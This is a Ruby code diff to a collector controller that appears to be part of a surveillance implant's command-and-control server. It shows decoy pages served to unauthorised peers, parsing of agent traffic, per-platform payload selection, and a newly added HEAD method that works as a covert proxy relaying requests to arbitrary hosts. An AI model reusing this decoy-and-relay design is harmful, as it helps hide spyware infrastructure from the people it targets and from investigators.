@@ -16,11 +16,9 @@ class CollectorController < RESTController
   def put
     # only the DB is authorized to send PUT commands
     unless @request[:peer].eql? Config.instance.global['DB_ADDRESS'] then
-      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUT [#{req_uri}] commands!!!"
+      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUT [#{@request[:uri]}] commands!!!"
       return decoy_page
     end
-    
-    #TODO: time request from server
     
     # this is a request to save a file in the public dir
     return http_put_file @request[:uri], @request[:content] unless @request[:uri].start_with?('/RCS-NC_')
@@ -28,7 +26,7 @@ class CollectorController < RESTController
     content, content_type = NetworkController.push @request[:uri].split('_')[1], @request[:content]
     return ok(content, {content_type: content_type})
   end
-    
+
   def post
     # get the peer ip address if it was forwarded by a proxy
     peer = http_get_forwarded_peer(@request[:headers]) || @request[:peer]
@@ -36,7 +34,20 @@ class CollectorController < RESTController
     content, content_type, cookie = Protocol.parse peer, @request[:uri], @request[:cookie], @request[:content]
     return ok(content, {content_type: content_type, cookie: cookie})
   end
-  
+
+  def head
+    # we abuse this method to implement a proxy for the backend
+    # every request received are forwarded externally like a proxy
+
+    # only the DB is authorized to send HEAD commands
+    unless @request[:peer].eql? Config.instance.global['DB_ADDRESS'] or @request[:peer].eql? '127.0.0.1' then
+      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send HEAD [#{@request[:uri]}] commands!!!"
+      return decoy_page
+    end
+
+    return proxy_request(@request)
+  end
+
   #
   # HELPERS
   #
@@ -124,6 +135,31 @@ class CollectorController < RESTController
     return 'android', '.apk' if user_agent['Android;']
 
     return 'unknown', ''
+  end
+
+  def proxy_request(request)
+    trace :debug, "#{request}"
+
+    # split the request to create the real proxied request
+    # the format is:  /METHOD/host/url
+    params = request[:uri].split('/')
+    params.shift
+    method = params.shift
+    host = params.shift
+    url = '/' + params.join('/')
+
+    trace :debug, "Proxying (#{method}): host: #{host} url: #{url}"
+    http = Net::HTTP.new(host, 80)
+
+    case method
+      when 'GET'
+        resp = http.get(url)
+      when 'POST'
+        resp = http.post(url, request[:content])
+    end
+
+    return server_error(resp.body) unless resp.kind_of? Net::HTTPSuccess
+    return ok(resp.body, {content_type: 'text/html'})
   end
 
 end # RCS::Controller::CollectorController
